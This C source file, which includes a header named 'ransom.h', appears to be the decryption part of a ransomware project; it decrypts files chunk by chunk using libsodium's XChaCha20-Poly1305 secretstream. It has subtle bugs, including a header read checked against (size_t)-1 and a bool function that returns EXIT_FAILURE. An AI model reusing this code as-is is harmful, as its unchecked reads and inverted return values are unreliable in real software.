#include "ransom.h"
#include <stdlib.h>

bool init_decryption(FILE **to_decrypt, FILE **decrypted,
    const char *filepath, const char *optfilepath)
{
    if (!(*to_decrypt = fopen(filepath, "rb"))
            || !(*decrypted = fopen(optfilepath, "wb"))) {
        perror("fopen");
        return EXIT_FAILURE;
    }
    return EXIT_SUCCESS;
}

int read_header(unsigned char *generated_key,
    FILE **to_decrypt, FILE **decrypted, crypto_secretstream_xchacha20poly1305_state *st)
{
    unsigned char header[crypto_secretstream_xchacha20poly1305_HEADERBYTES];

    if (fread(header, 1, sizeof(header), *to_decrypt) == (size_t) -1
        || crypto_secretstream_xchacha20poly1305_init_pull(
            st, header, generated_key)) {
        perror("Incorrect header.");
        return graceful_exit(*to_decrypt, *decrypted, generated_key, EXIT_FAILURE);
    }
    return EXIT_SUCCESS;
}

int decryption_loop(FILE *to_decrypt, FILE *decrypted,
    crypto_secretstream_xchacha20poly1305_state st)
{
    unsigned char in[CHUNK_SIZE + crypto_secretstream_xchacha20poly1305_ABYTES];
    unsigned char out[CHUNK_SIZE];
    unsigned long long opt_len = 0;
    size_t read_len = 0;
    int eof = 0;
    unsigned char tag = 0;

    do {
        read_len = fread(in, 1, sizeof(in), to_decrypt);
        eof = feof(to_decrypt);
        if (crypto_secretstream_xchacha20poly1305_pull(&st, out, &opt_len, &tag,
            in, read_len, NULL, 0)) {
            perror("Corrupted chunk encountered.");
            return EXIT_FAILURE;
        }
        else if (tag == crypto_secretstream_xchacha20poly1305_TAG_FINAL && !eof) {
            perror("premature end.");
            return EXIT_FAILURE;
        }
        else fwrite(out, 1, (size_t) opt_len, decrypted);

    } while (!eof);
    return EXIT_SUCCESS;
}
